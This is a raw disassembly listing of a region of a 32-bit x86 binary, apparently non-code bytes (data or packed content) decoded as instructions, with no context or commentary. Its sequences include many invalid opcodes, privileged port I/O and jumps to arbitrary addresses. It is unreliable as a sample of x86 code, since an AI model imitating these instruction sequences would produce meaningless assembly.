  422957:	sti    
  422958:	dec    ecx
  422959:	mov    bl,0x94
  42295b:	je     0x422934
  42295d:	call   0xd08f:0x7f29ea40
  422964:	add    DWORD PTR [eax],eax
  422966:	arpl   WORD PTR [eax],ax
  422968:	add    BYTE PTR [eax],al
  42296a:	sbb    eax,0x7723fd6f
  42296f:	sbb    BYTE PTR [esi+0x54142d13],al
  422975:	adc    esi,ebx
  422977:	(bad)
  42297b:	test   DWORD PTR es:[ecx+0x35],ebx
  42297f:	repnz mov ebp,0xf52f8844
  422985:	adc    BYTE PTR [ebx+ebp*1],bh
  422988:	cmp    eax,0x662c653c
  42298d:	out    0x12,al
  42298f:	inc    ebp
  422990:	fidiv  DWORD PTR [edi-0x41]
  422993:	fistp  QWORD PTR [edi+0x45]
  422996:	in     eax,0x91
  422998:	div    DWORD PTR [eax-0x5caeb5a]
  42299e:	mov    eax,ds:0x8036e7ad
  4229a3:	dec    eax
  4229a4:	jo     0x4229d1
  4229a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229a7:	mov    bl,0xbd
  4229a9:	jecxz  0x4229af
  4229ab:	add    al,0x35
  4229ad:	jae    0x422968
  4229af:	lock xchg DWORD PTR [edx],ebx
  4229b2:	into   
  4229b3:	es dec ebp
  4229b5:	pushf  
  4229b6:	scas   al,BYTE PTR es:[edi]
  4229b7:	xchg   ecx,eax
  4229b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229b9:	test   cl,0x9e
  4229bc:	xor    DWORD PTR [ebx+ebx*8+0x48b9b51],0xffffffa5
  4229c4:	pop    ecx
  4229c5:	loopne 0x422a41
  4229c7:	popf   
  4229c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229c9:	call   0x10b1bff
  4229ce:	add    BYTE PTR [eax],al
  4229d0:	add    BYTE PTR [eax],al
  4229d2:	fist   WORD PTR [ebx-0x4e]
  4229d5:	dec    edi
  4229d6:	mov    esi,0x67d3ffef
  4229db:	xchg   ecx,edi
  4229dd:	adc    al,0xc1
  4229df:	leave  
  4229e0:	add    BYTE PTR [ebx+0x1d0f2],0x63
  4229e7:	add    BYTE PTR [eax],al
  4229e9:	add    BYTE PTR [ebp-0x62],al
  4229ec:	jnp    0x4229ad
  4229ee:	fmul   DWORD PTR [eax+0x1e]
  4229f1:	xchg   esi,eax
  4229f2:	imul   ebx,esp,0x2771cee9
  4229f8:	daa    
  4229f9:	push   ecx
  4229fa:	add    ch,BYTE PTR [ecx-0x386ef5b5]
  422a00:	xchg   ch,bl
  422a02:	sbb    al,BYTE PTR [esi]
  422a04:	out    dx,al
  422a05:	add    edx,DWORD PTR [edi+0x504c2fe8]
  422a0b:	xchg   bh,dl
  422a0d:	push   cs
  422a0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a0f:	pop    esi
  422a10:	cmp    ecx,DWORD PTR [esi]
  422a12:	stc    
  422a13:	jmp    0x58f9d87b
  422a18:	add    eax,0x48e96801
  422a1d:	imul   esp,DWORD PTR [edi+0x4275046a],0xffffff8c
  422a24:	mov    edx,0xb9e8601b
  422a29:	gs fxch st(6)
  422a2c:	dec    eax
  422a2d:	xchg   ecx,eax
  422a2e:	cwde   
  422a2f:	out    dx,al
  422a30:	mov    dh,0x1
  422a32:	add    esp,ebx
  422a34:	mov    bl,0x64
  422a36:	imul   edi,DWORD PTR [esi+ebp*4],0x6a62825d
  422a3d:	ss jnp 0x422a43
  422a40:	xor    al,0xa1
  422a42:	jmp    0xb53d4bb0
  422a47:	das    
  422a48:	adc    DWORD PTR [esi+eiz*2-0x33],ebp
  422a4c:	add    eax,0x0
  422a51:	add    BYTE PTR [edi-0x24252cf4],al
  422a57:	fisttp WORD PTR [edi+0x640ccb5d]
  422a5d:	push   ss
  422a5e:	add    ebp,DWORD PTR [ebx-0x2eaab469]
  422a64:	add    DWORD PTR [eax],eax
  422a66:	arpl   WORD PTR [eax],ax
  422a68:	add    BYTE PTR [eax],al
  422a6a:	sbb    al,0xbe
  422a6c:	pop    ebp
  422a6d:	inc    eax
  422a6f:	push   cs
  422a70:	les    esi,FWORD PTR gs:[edi-0xe]
  422a74:	in     al,dx
  422a75:	adc    ch,BYTE PTR [edx+0x2db4a84c]
  422a7b:	test   BYTE PTR [edi],dl
  422a7d:	mov    esp,0x5b10efed
  422a82:	cmc    
  422a83:	mov    WORD PTR [ecx],ds
  422a85:	xor    DWORD PTR [edi+0x53a9b685],0x897e0277
  422a8f:	mov    bh,0xd2
  422a91:	mov    eax,ds:0x2f39b562
  422a96:	int3   
  422a97:	pusha  
  422a98:	(bad)  
  422a9a:	inc    eax
  422a9b:	mov    al,0x93
  422a9d:	or     ch,BYTE PTR [ebx]
  422a9f:	fmul   QWORD PTR [edi+0x5cf91785]
  422aa5:	popa   
  422aa6:	mov    ds:0x93e4a98b,al
  422aab:	(bad)  
  422aac:	jp     0x422a53
  422aae:	and    al,0xbb
  422ab0:	adc    BYTE PTR ds:0x2fe74f0e,0x2e
  422ab7:	sti    
  422ab8:	xor    ch,al
  422aba:	sub    edx,esp
  422abc:	daa    
  422abd:	dec    eax
  422abe:	pop    edx
  422abf:	scas   al,BYTE PTR es:[edi]
  422ac0:	ja     0x422b2d
  422ac2:	scas   eax,DWORD PTR es:[edi]
  422ac3:	mov    edi,0xd773a58b
  422ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ac9:	dec    eax
  422aca:	lahf   
  422acb:	add    eax,0x8f
  422ad0:	add    BYTE PTR [eax],al
  422ad2:	lahf   
  422ad3:	arpl   WORD PTR [ebp+0x72],cx
  422ad6:	std    
  422ad7:	jle    0x422a98
  422ad9:	out    dx,eax
  422ada:	sbb    edi,esp
  422adc:	mov    BYTE PTR [ebp+eax*1-0x472301c4],dh
  422ae3:	rol    DWORD PTR [ecx],1
  422ae5:	add    BYTE PTR [ebx+0x0],ah
  422ae8:	add    BYTE PTR [eax],al
  422aea:	stos   BYTE PTR es:[edi],al
  422aeb:	fcmovu st,st(6)
  422aed:	or     eax,0x136736e5
  422af2:	mov    ds:0xa8abcf6e,al
  422af7:	adc    DWORD PTR [edx],edi
  422af9:	push   ecx
  422afa:	nop
  422afb:	into   
  422afc:	mov    bl,0x6f
  422afe:	(bad)  
  422aff:	jnp    0x422ae8
  422b01:	inc    ecx
  422b02:	sbb    edi,DWORD PTR ds:0x8603b48
  422b08:	push   edx
  422b09:	or     al,0x38
  422b0b:	fisttp QWORD PTR [ecx]
  422b0d:	daa    
  422b0e:	mov    ebp,0x2537d11f
  422b13:	daa    
  422b14:	dec    esi
  422b15:	test   cl,ch
  422b17:	fwait
  422b18:	stos   DWORD PTR es:[edi],eax
  422b19:	jno    0x422aee
  422b1b:	pop    esi
  422b1c:	mov    ebp,0xaa1f5d2a
  422b21:	pusha  
  422b22:	fist   DWORD PTR [edx]
  422b24:	cmp    bh,BYTE PTR [eax]
  422b26:	mov    ebx,0xf5f8538c
  422b2b:	aas    
  422b2c:	arpl   WORD PTR [eax+ecx*1+0x5b],di
  422b30:	out    0x7b,al
  422b32:	push   ds
  422b33:	sbb    BYTE PTR [ecx],0x9c
  422b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b37:	out    dx,al
  422b38:	xchg   esp,eax
  422b39:	adc    esi,DWORD PTR [ecx-0x6b]
  422b3c:	pushf  
  422b3d:	or     al,0xb7
  422b3f:	xor    ebx,DWORD PTR [edx-0xf]
  422b42:	and    DWORD PTR [ebx+0x2242dc1b],ebp
  422b48:	lahf   
  422b49:	pop    ebp
  422b4a:	(bad)  
  422b4b:	fdivr  QWORD PTR [ebp+0x0]
  422b4e:	add    BYTE PTR [eax],al
  422b50:	add    BYTE PTR [eax],al
  422b52:	jo     0x422b77
  422b54:	and    eax,0x7c6f7769
  422b59:	cmp    esp,DWORD PTR [eax-0x4a4311e4]
  422b5f:	xor    ebp,DWORD PTR [edi+ebp*2+0x1b]
  422b63:	rol    BYTE PTR [ecx],cl
  422b65:	add    BYTE PTR [ebx+0x0],ah
  422b68:	add    BYTE PTR [eax],al
  422b6a:	mov    esp,0xc1d606c6
  422b6f:	adc    al,0x5a
  422b71:	fwait
  422b72:	in     al,dx
  422b73:	outs   dx,BYTE PTR ds:[esi]
  422b74:	shl    BYTE PTR [eiz*2-0x65637a4e],1
  422b7b:	inc    ebp
  422b7c:	out    dx,al
  422b7d:	jo     0x422bc8
  422b7f:	pop    ebx
  422b80:	ss lahf 
  422b82:	sbb    BYTE PTR [ecx-0x9b2843d],al
  422b88:	(bad)  
  422b89:	xor    eax,0xb73edae5
  422b8e:	xchg   edx,eax
  422b8f:	stc    
  422b90:	fisub  DWORD PTR ds:0xf3b1bc7e
  422b96:	cli    
  422b97:	jmp    0xb042:0x7419b049
  422b9e:	(bad)  
  422b9f:	mov    ah,0x2
  422ba1:	(bad)  
  422ba2:	lock bound esp,QWORD PTR [ecx-0x236abace]
  422ba9:	ins    BYTE PTR es:[edi],dx
  422baa:	add    eax,0x2c140bd4
  422baf:	lds    ecx,FWORD PTR [ecx]
  422bb1:	jp     0x422c08
  422bb3:	push   edi
  422bb4:	pop    esp
  422bb5:	sar    BYTE PTR [edi-0xa1c5c74],cl
  422bbb:	imul   ebp,ebp,0x3c
  422bbe:	push   esp
  422bbf:	mov    edx,0x4064e671
  422bc4:	add    eax,0x2c22a591
  422bc9:	cwde   
  422bca:	push   eax
  422bcb:	repz add al,0x0
  422bce:	add    BYTE PTR [eax],al
  422bd0:	add    BYTE PTR [eax],al
  422bd2:	xchg   esp,eax
  422bd3:	nop
  422bd4:	ffree  st(0)
  422bd6:	(bad)  
  422bd8:	popf   
  422bd9:	aam    0x57
  422bdb:	(bad)
  422bdf:	mov    eax,0xd27eb49a
  422be4:	add    DWORD PTR [eax],eax
  422be6:	arpl   WORD PTR [eax],ax
  422be8:	add    BYTE PTR [eax],al
  422bea:	popf   
  422beb:	icebp  
  422bec:	ror    ebp,1
  422bee:	xor    eax,0x36ebdfc1
  422bf3:	iret   
  422bf4:	ret    
  422bf5:	jl     0x422bcc
  422bf7:	cwde   
  422bf8:	add    BYTE PTR [edi+0x25],al
  422bfb:	retf   0xa226
  422bfe:	mov    ebx,0x7ce072a6
  422c03:	lahf   
  422c04:	dec    ebp
  422c05:	xchg   BYTE PTR [edx+0x17ed3a39],dl
  422c0b:	fdiv   DWORD PTR [eax+0x2d1ae855]
  422c11:	adc    eax,0xc6edeab0
  422c16:	push   ecx
  422c17:	jl     0x422bcf
  422c19:	add    al,0xa8
  422c1b:	push   ds
  422c1c:	xchg   BYTE PTR [esi-0x5b],dl
  422c1f:	or     ah,0x53
  422c22:	xchg   esp,eax
  422c23:	int    0xb7
  422c25:	call   0x61efc702
  422c2a:	pop    ebp
  422c2b:	addr16 into 
  422c2d:	dec    eax
  422c2e:	push   eax
  422c2f:	lock add BYTE PTR [ebx],0xc2
  422c33:	daa    
  422c34:	pop    es
  422c35:	iret   
  422c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c37:	jae    0x422c5d
  422c39:	sub    DWORD PTR [esi],esi
  422c3b:	jne    0x422ca4
  422c3d:	sbb    BYTE PTR [ebx+ebx*1-0x4673bc2a],ch
  422c44:	inc    ecx
  422c45:	pop    edi
  422c46:	(bad)  
  422c47:	jbe    0x422c78
  422c49:	ds jb  0x422c4e
  422c4c:	adc    DWORD PTR [eax],eax
  422c4e:	add    BYTE PTR [eax],al
  422c50:	add    BYTE PTR [eax],al
  422c52:	hlt    
  422c53:	mov    dl,0x32
  422c55:	(bad)  
  422c56:	jbe    0x422c2e
  422c58:	hlt    
  422c59:	mov    dl,0xb1
  422c5b:	and    al,0xfe
  422c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5e:	int3   
  422c5f:	(bad)  
  422c60:	mov    eax,ds:0x1d2e1be
  422c65:	add    BYTE PTR [ebx+0x0],ah
  422c68:	add    BYTE PTR [eax],al
  422c6a:	dec    esi
  422c6b:	pop    ss
  422c6c:	or     edx,edx
  422c6e:	pop    es
  422c6f:	or     eax,0xb8db1948
  422c74:	repnz lfs edx,FWORD PTR [esi+0x3d]
  422c79:	into   
  422c7a:	and    DWORD PTR [esi+eiz*1-0x74],0x6185d06d
  422c82:	scas   eax,DWORD PTR es:[edi]
  422c83:	inc    ebx
  422c84:	out    dx,al
  422c85:	rcl    esi,0xb1
  422c88:	inc    edx
  422c89:	mov    ss,WORD PTR [eax]
  422c8b:	sub    al,0x7
  422c8d:	xor    eax,0xeca43b56
  422c92:	jnp    0x422d0e
  422c94:	(bad)  
  422c95:	lods   eax,DWORD PTR ds:[esi]
  422c96:	mov    dl,al
  422c98:	sub    al,0x78
  422c9a:	idiv   DWORD PTR [ebp-0x5aa1d3f2]
  422ca0:	out    0x9e,eax
  422ca2:	add    BYTE PTR [edx],cl
  422ca4:	ror    esp,0xe9
  422ca7:	mov    dh,0xac
  422ca9:	clc    
  422caa:	aaa    
  422cab:	icebp  
  422cac:	push   ds
  422cad:	ja     0x422ced
  422caf:	aad    0xdd
  422cb1:	sar    esp,0x52
  422cb4:	repz fstp DWORD PTR [esi+ecx*1+0x6a]
  422cb9:	jg     0x422ce3
  422cbb:	js     0x422ca1
  422cbd:	ror    ebx,0xbb
  422cc0:	mov    dh,BYTE PTR [edi+eiz*8-0x3f0a882d]
  422cc7:	dec    edi
  422cc8:	mov    cl,0x50
  422cca:	mov    WORD PTR [ecx],?
  422ccc:	adc    al,0x0
  422cce:	add    BYTE PTR [eax],al
  422cd0:	add    BYTE PTR [eax],al
  422cd2:	xor    dl,bl
  422cd4:	into   
  422cd5:	mov    ds:0xd37ebfef,al
  422cda:	sub    edi,DWORD PTR [esi]
  422cdc:	out    0x3f,eax
  422cde:	out    dx,eax
  422cdf:	mov    ecx,0xd3446df6
  422ce4:	add    DWORD PTR [eax],eax
  422ce6:	arpl   WORD PTR [eax],ax
  422ce8:	add    BYTE PTR [eax],al
  422cea:	and    al,0x60
  422cec:	jecxz  0x422ca7
  422cee:	xlat   BYTE PTR ds:[ebx]
  422cef:	jl     0x422ce7
  422cf1:	das    
  422cf2:	or     eax,0x8126d342
  422cf7:	ins    BYTE PTR es:[edi],dx
  422cf8:	push   ds
  422cf9:	shl    BYTE PTR [eax],0x82
  422cfc:	mov    al,ds:0xbd9de3b0
  422d01:	js     0x422cde
  422d03:	sbb    DWORD PTR [esi],ebp
  422d05:	cli    
  422d06:	adc    BYTE PTR [ebp+eax*4+0x5d1e582b],0x1e
  422d0e:	lods   eax,DWORD PTR ds:[esi]
  422d0f:	mov    al,0xc1
  422d11:	sbb    BYTE PTR [eax-0x71],ah
  422d14:	fdiv   st,st(4)
  422d16:	mov    ecx,0x85278e1a
  422d1b:	arpl   cx,ax
  422d1d:	fistp  QWORD PTR [ebx+0x46]
  422d20:	adc    bl,BYTE PTR [ebx-0x28]
  422d23:	test   eax,0xafdd5303
  422d29:	xchg   esp,eax
  422d2a:	(bad)  
  422d2b:	push   ebx
  422d2c:	stos   DWORD PTR es:[edi],eax
  422d2d:	mov    ebp,0xd7a03e5a
  422d32:	leave  
  422d33:	cdq    
  422d34:	sbb    al,cl
  422d36:	out    0x67,eax
  422d38:	int    0xa1
  422d3a:	retf   0x746
  422d3d:	int3   
  422d3e:	push   esi
  422d3f:	cmp    BYTE PTR [edi],bl
  422d41:	test   al,0x8b
  422d43:	cs mov dh,0x64
  422d46:	or     ch,BYTE PTR [esp+edx*4+0x26ba791d]
  422d4d:	add    BYTE PTR [eax],al
  422d4f:	add    BYTE PTR [eax],al
  422d51:	add    bl,bl
  422d53:	in     eax,dx
  422d54:	outs   dx,BYTE PTR ds:[esi]
  422d55:	and    bh,BYTE PTR [esi-0x5d]
  422d58:	(bad)  
  422d5a:	pop    esi
  422d5b:	(bad)  
  422d5c:	mov    DWORD PTR [ebp+0x78464c3a],ecx
  422d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d63:	rol    DWORD PTR [ecx],cl
  422d65:	add    BYTE PTR [ebx+0x0],ah
  422d68:	add    BYTE PTR [eax],al
  422d6a:	push   0xdafe99be
  422d6f:	(bad)
  422d74:	and    eax,0x826f3e8
  422d79:	jbe    0x422df5
  422d7b:	ret    
  422d7c:	les    edx,FWORD PTR [ebx]
  422d7e:	mov    cl,0x69
  422d80:	imul   eax,DWORD PTR [eax+0x66],0x94d4b7cd
  422d87:	ror    bl,1
  422d89:	xlat   BYTE PTR ds:[ebx]
  422d8a:	clc    
  422d8b:	std    
  422d8c:	or     al,0x92
  422d8e:	jmp    0x298e:0xf57ad722
  422d95:	dec    eax
  422d96:	les    eax,FWORD PTR [ebx]
  422d98:	xchg   ecx,eax
  422d99:	jb     0x422d76
  422d9b:	mov    bh,0xd3
  422d9d:	mov    ebx,0x104781f9
  422da2:	sub    dl,BYTE PTR [edx+0x21]
  422da5:	ja     0x422dd6
  422da7:	scas   al,BYTE PTR es:[edi]
  422da8:	lahf   
  422da9:	ret    0x9773
  422dac:	daa    
  422dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422dae:	shl    ah,cl
  422db0:	mov    bh,0x39
  422db2:	int    0x8d
  422db4:	sbb    al,0xb2
  422db6:	jmp    0x84167c68
  422dbb:	xor    cl,bl
  422dbd:	cmp    BYTE PTR [eax-0x1a],0x55
  422dc1:	popf   
  422dc2:	ja     0x422e28
  422dc4:	dec    eax
  422dc5:	ret    0x801e
  422dc8:	mov    dh,0x2d
  422dca:	outs   dx,DWORD PTR ds:[esi]
  422dcb:	push   ebp
  422dcc:	xor    al,BYTE PTR [eax]
  422dce:	add    BYTE PTR [eax],al
  422dd0:	add    BYTE PTR [eax],al
  422dd2:	add    eax,0x6f976b22
  422dd7:	(bad)  
  422dd9:	mov    dl,0x66
  422ddb:	and    BYTE PTR [esi+0x5e0f556a],ah
  422de1:	test   DWORD PTR [edx],ecx
  422de3:	aam    0x1
  422de5:	add    BYTE PTR [ebx+0x0],ah
  422de8:	add    BYTE PTR [eax],al
  422dea:	xchg   esi,eax
  422deb:	push   edi
  422dec:	shl    DWORD PTR [eax],0x55
  422def:	push   ecx
  422df0:	rcl    BYTE PTR [eax+0x79280ffc],0x81
  422df7:	repz dec esp
  422df9:	jno    0x422dce
  422dfb:	fadd   QWORD PTR [edi*4-0x6eca6a32]
  422e02:	repnz pusha 
  422e04:	out    0x50,eax
  422e06:	scas   eax,DWORD PTR es:[edi]
  422e07:	and    DWORD PTR [esi],ebx
  422e09:	in     al,dx
  422e0a:	pop    DWORD PTR [edi+ebp*8+0x7d]
  422e0e:	or     al,0x23
  422e10:	or     eax,0x23c49032
  422e15:	into   
  422e16:	add    eax,0xfb2c287a
  422e1b:	sar    esp,0xd2
  422e1e:	les    ebp,FWORD PTR [ebp+0x4b]
  422e21:	mov    al,ds:0x8d4d0c29
  422e26:	loop   0x422e8a
  422e28:	out    0x2f,al
  422e2a:	jmp    0x11cf:0xf061a175
  422e31:	cmp    ah,cl
  422e33:	cmp    esi,ebx
  422e35:	fidivr DWORD PTR ds:0xdb4533f3
  422e3b:	mov    cl,0x13
  422e3d:	hlt    
  422e3e:	pop    ss
  422e3f:	gs mov ebp,0xa1862905
  422e45:	outs   dx,BYTE PTR ds:[esi]
  422e46:	lock rcr DWORD PTR [edx],1
  422e49:	cli    
  422e4a:	xlat   BYTE PTR ds:[ebx]
  422e4b:	addr16 pop ecx
  422e4d:	add    BYTE PTR [eax],al
  422e4f:	add    BYTE PTR [eax],al
  422e51:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422e57:	stc    
  422e58:	call   esi
  422e5a:	into   
  422e5b:	inc    ebp
  422e5c:	mov    bh,0x11
  422e5e:	(bad)  
  422e5f:	(bad)  
  422e60:	and    DWORD PTR [ecx+0x1d46d],ebp
  422e66:	arpl   WORD PTR [eax],ax
  422e68:	add    BYTE PTR [eax],al
  422e6a:	jb     0x422ea4
  422e6c:	cld    
  422e6d:	clc    
  422e6e:	mov    bl,BYTE PTR [edx+ecx*2]
  422e71:	clc    
  422e72:	mov    edx,edx
  422e74:	mov    ds:0x736f1e0c,al
  422e79:	stos   DWORD PTR es:[edi],eax
  422e7a:	vpaddusb ymm6,ymm3,YMMWORD PTR [ebx]
  422e7e:	add    al,0x32
  422e80:	pop    ecx
  422e81:	sub    eax,0x894c6b07
  422e86:	and    al,0x2e
  422e88:	and    al,ch
  422e8a:	pop    ss
  422e8b:	mov    esp,DWORD PTR [ecx+0x1]
  422e8e:	sub    bl,BYTE PTR [ebx+ebx*4-0x16]
  422e92:	mov    al,ds:0xcf1235dc
  422e97:	xor    BYTE PTR [eiz*4-0x9ad2d3],dh
  422e9e:	addr16 pushf 
  422ea0:	and    dl,BYTE PTR [ebx+0x26f08b9d]
  422ea6:	or     BYTE PTR [eax+0x4d9511bb],cl
  422eac:	mov    ah,0x7b
  422eae:	neg    BYTE PTR [eax]
  422eb0:	shl    BYTE PTR [esi],1
  422eb2:	xor    ebx,DWORD PTR [edi]
  422eb4:	adc    eax,0x5bffb8a5
  422eb9:	jge    0x422f0f
  422ebb:	in     eax,dx
  422ebc:	mov    edi,0x30a33170
  422ec1:	es (bad) 
  422ec3:	(bad)  
  422ec4:	fstp   st(0)
  422ec6:	aad    0xe
  422ec8:	jb     0x422eea
  422eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ecb:	in     al,0x88
  422ecd:	add    BYTE PTR [eax],al
  422ecf:	add    BYTE PTR [eax],al
  422ed1:	add    dh,bl
  422ed3:	sub    DWORD PTR [eax-0x210c002e],ebx
  422ed9:	sub    eax,0x4af35f6
  422ede:	xor    dl,ah
  422ee0:	pop    esp
  422ee1:	cld    
  422ee2:	rcl    ah,1
  422ee4:	add    DWORD PTR [eax],eax
  422ee6:	arpl   WORD PTR [eax],ax
  422ee8:	add    BYTE PTR [eax],al
  422eea:	inc    eax
  422eeb:	push   esi
  422eec:	sub    al,0x59
  422eee:	pushf  
  422eef:	mov    bh,0x43
  422ef1:	xchg   esi,eax
  422ef2:	add    al,0x2e
  422ef4:	sbb    al,0xe8
  422ef6:	and    edi,DWORD PTR [ecx-0x75164eb2]
  422efc:	push   esi
  422efd:	fadd   DWORD PTR [ecx+0x74]
  422f00:	xor    DWORD PTR [edi],0x84c0995
  422f06:	into   
  422f07:	mov    ch,0xfc
  422f09:	inc    ecx
  422f0a:	(bad)  
  422f0b:	stos   DWORD PTR es:[edi],eax
  422f0c:	or     dl,0x22
  422f0f:	test   DWORD PTR [eax],esi
  422f11:	popa   
  422f12:	das    
  422f13:	dec    esp
  422f14:	or     al,0xea
  422f16:	xchg   DWORD PTR [ecx-0x5d],ebp
  422f19:	mov    dl,0xb0
  422f1b:	loopne 0x422f73
  422f1d:	xor    eax,0x8669983f
  422f22:	pop    es
  422f23:	out    0x1b,al
  422f25:	jp     0x422f00
  422f27:	sahf   
  422f28:	std    
  422f29:	cmp    eax,0xa5276c4b
  422f2e:	(bad)  
  422f2f:	outs   dx,BYTE PTR ds:[esi]
  422f30:	add    BYTE PTR [ecx+0x45751823],bh
  422f36:	cmp    DWORD PTR [esi-0x18299403],ebx
  422f3c:	dec    ebx
  422f3d:	cld    
  422f3e:	and    dl,bl
  422f40:	add    bh,BYTE PTR [ebx+eax*4-0x58f896e7]
  422f47:	in     al,0x8d
  422f49:	dec    esp
  422f4a:	loop   0x422f14
  422f4c:	mov    bh,0x0
  422f4e:	add    BYTE PTR [eax],al
  422f50:	add    BYTE PTR [eax],al
  422f52:	dec    esi
  422f53:	aas    
  422f54:	int3   
  422f55:	sbb    eax,0x7fdffffd
  422f5a:	out    dx,eax
  422f5b:	loopne 0x422f73
  422f5d:	lods   al,BYTE PTR ds:[esi]
  422f5e:	(bad)  
  422f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f60:	fsub   QWORD PTR [ebx+esi*1-0x2b]
  422f64:	add    DWORD PTR [eax],eax
  422f66:	arpl   WORD PTR [eax],ax
  422f68:	add    BYTE PTR [eax],al
  422f6a:	jns    0x422f07
  422f6c:	loope  0x422f6e
  422f6e:	inc    edi
  422f6f:	stos   BYTE PTR es:[edi],al
  422f70:	mov    al,ds:0xc20760b6
  422f75:	shl    BYTE PTR [ebp+edi*8+0x63],cl
  422f79:	pusha  
  422f7a:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f7c:	adc    bl,BYTE PTR [esi+0x28]
  422f7f:	adc    BYTE PTR [edx+ebx*2-0x25],al
  422f83:	dec    ebp
  422f84:	mov    edi,0xcd22c2d8
  422f89:	pop    edi
  422f8a:	daa    
  422f8b:	push   esi
  422f8c:	retf   0x3e2c
  422f8f:	jl     0x422fa3
  422f91:	mov    dh,0xf2
  422f93:	push   esp
  422f94:	add    cl,BYTE PTR [ecx]
  422f96:	cmc    
  422f97:	adc    al,0x35
  422f99:	outs   dx,DWORD PTR ds:[esi]
  422f9a:	dec    esp
  422f9b:	push   edi
  422f9c:	and    BYTE PTR [ebx-0x76],bl
  422f9f:	arpl   WORD PTR [ecx+0x40],sp
  422fa2:	into   
  422fa3:	push   ebp
  422fa4:	add    ah,BYTE PTR [ebx+0x6ea14ffe]
  422faa:	mov    dh,0x47
  422fac:	jp     0x422f87
  422fae:	ss jmp 0x9d5b:0x11cae4ef
  422fb6:	adc    bl,bl
  422fb8:	stos   DWORD PTR es:[edi],eax
  422fb9:	or     al,0x9c
  422fbb:	or     ecx,DWORD PTR [edx+0x11]
  422fbe:	jae    0x423005
  422fc0:	retf   0x6490
  422fc3:	add    BYTE PTR [ecx],bl
  422fc5:	pop    esi
  422fc6:	rcr    BYTE PTR [eax+ebx*1+0x6f3da248],cl
  422fcd:	add    BYTE PTR [eax],al
  422fcf:	add    BYTE PTR [eax],al
  422fd1:	add    BYTE PTR [esi],bl
  422fd3:	test   eax,0x7ff735f6
  422fd8:	fild   QWORD PTR [ebx-0x5f9ed871]
  422fde:	and    eax,0x96d9fb25
  422fe3:	aad    0x1
  422fe5:	add    BYTE PTR [ebx+0x0],ah
  422fe8:	add    BYTE PTR [eax],al
  422fea:	popf   
  422feb:	aam    0x92
  422fed:	std    
  422fee:	jg     0x422f90
  422ff0:	inc    esi
  422ff1:	aas    
  422ff2:	jge    0x423011
  422ff4:	cmp    al,0x92
  422ff6:	push   0x31
  422ff8:	pop    esi
  422ffa:	in     al,dx
  422ffb:	in     eax,0x26
  422ffd:	rcr    DWORD PTR [esi+0x8],cl
  423000:	das    
  423001:	dec    edi
  423002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423003:	dec    esi
  423004:	jecxz  0x42302f
  423006:	cmp    eax,0xe3067235
  42300b:	mov    ebp,DWORD PTR [ebx]
  42300d:	and    eax,0xce6bf303
  423012:	mov    bl,0x4a
  423014:	cmp    eax,0x11532431
  423019:	popf   
  42301a:	jns    0x422fa2
  42301c:	push   eax
  42301d:	test   DWORD PTR ss:[ecx-0x1af5df11],edx
  423024:	fstp   TBYTE PTR [bx+si-0x9b0]
  423029:	(bad)  
  42302a:	adc    DWORD PTR [ebx+0x610ba3fb],ecx
  423030:	jb     0x422fc9
  423032:	fisttp QWORD PTR [esi]
  423034:	fidiv  WORD PTR [eax-0x461ce61d]
  42303a:	test   esp,edx
  42303c:	pusha  
  42303d:	gs push cs
  42303f:	and    al,0x23
  423041:	in     al,0x6b
  423043:	sub    BYTE PTR [eax],ch
  423045:	dec    ebp
  423046:	jg     0x42302a
  423048:	mov    eax,0xf01edd9
  42304d:	add    BYTE PTR [eax],al
  42304f:	add    BYTE PTR [eax],al
  423051:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  423057:	lods   eax,DWORD PTR ds:[esi]
  423058:	fcomi  st,st(7)
  42305a:	sar    BYTE PTR [ebx],cl
  42305c:	(bad)  
  42305d:	add    BYTE PTR [eax],bl
  42305f:	inc    ebp
  423060:	(bad)  
  423061:	dec    ecx
  423062:	stc    
  423063:	aad    0x1
  423065:	add    BYTE PTR [ebx+0x0],ah
  423068:	add    BYTE PTR [eax],al
  42306a:	dec    ebx
  42306b:	cmp    eax,0xf4e17b3b
  423070:	daa    
  423071:	test   eax,0x1c2613ef
  423076:	ins    BYTE PTR es:[edi],dx
  423077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423078:	pop    esi
  423079:	outs   dx,BYTE PTR ds:[esi]
  42307a:	cli    
  42307b:	add    eax,0x979e663b
  423080:	and    al,0x6c
  423082:	sbb    DWORD PTR [ebp+0x71170762],0xffffff9c
  423089:	or     ebx,DWORD PTR [esi]
  42308b:	sub    eax,0x7a606796
  423090:	sub    BYTE PTR [ebx-0x76],dl
  423093:	mov    esp,0x2043ceb2
  423098:	ror    BYTE PTR [esi],cl
  42309a:	nop
  42309b:	add    ch,BYTE PTR ds:0x40be6236
  4230a1:	aaa    
  4230a2:	test   BYTE PTR [ebx+ebx*4-0x41883c0],0x70
  4230aa:	sbb    cl,BYTE PTR [edi-0x2a32e810]
  4230b0:	daa    
  4230b1:	popa   
  4230b2:	mov    al,0x39
  4230b4:	cmp    BYTE PTR [ecx-0x11740800],al
  4230ba:	out    dx,al
  4230bb:	dec    ebx
  4230bc:	xor    edi,DWORD PTR [ebx]
  4230be:	inc    eax
  4230bf:	push   edi
  4230c0:	or     bh,bl
  4230c2:	test   eax,0xd9a028f8
  4230c7:	inc    esp
  4230c8:	out    dx,eax
  4230c9:	adc    al,0x40
  4230cb:	and    esp,0x0
  4230ce:	add    BYTE PTR [eax],al
  4230d0:	add    BYTE PTR [eax],al
  4230d2:	or     bh,dh
  4230d4:	ja     0x423120
  4230d6:	dec    edx
  4230d8:	cmp    eax,0x2e8eedf7
